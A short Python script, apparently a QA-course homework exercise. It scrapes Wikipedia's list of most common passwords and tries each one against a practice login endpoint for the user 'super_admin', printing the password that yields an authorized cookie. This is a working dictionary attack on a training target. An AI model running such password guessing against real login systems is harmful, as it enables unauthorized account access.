import requests
from bs4 import BeautifulSoup


def tableDataText(table):
    def rowgetDataText(tr, coltag='td'):  # td (data) or th (header)
        return [td.get_text(strip=True) for td in tr.find_all(coltag)]

    rows = []
    trs = table.find_all('tr')
    headerow = rowgetDataText(trs[0], 'th')
    if headerow:  # if there is a header row include first
        rows.append(headerow)
        trs = trs[1:]
    for tr in trs:  # for every table row
        rows.append(rowgetDataText(tr, 'td'))  # data row
    return rows


WRONG_RESP = "You are NOT authorized"
CORRECT_RESP = "You are authorized"

wikipage_url = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords#SplashData"
wiki = requests.get(wikipage_url)
soup = BeautifulSoup(wiki.text, 'lxml')
table_data = soup.findAll('table')[1]
test_table = tableDataText(table_data)
test_table = test_table[1:]
pass_list = []
for i in range(len(test_table)):
    for j in range(len(test_table[i])):
        if j != 0 and test_table[i][j] not in pass_list:
            pass_list.append(test_table[i][j])

auth_url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
check_cookie_url = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
passwords = {1}
cookies = {}
for password in pass_list:
    payload = {"login": "super_admin", "password": password}
    auth_cookie = requests.post(auth_url, data=payload).cookies.get("auth_cookie")
    cookies.update({"auth_cookie": auth_cookie})
    res = requests.get(check_cookie_url, cookies=cookies)
    if res.text == CORRECT_RESP:
        print(password)
        break
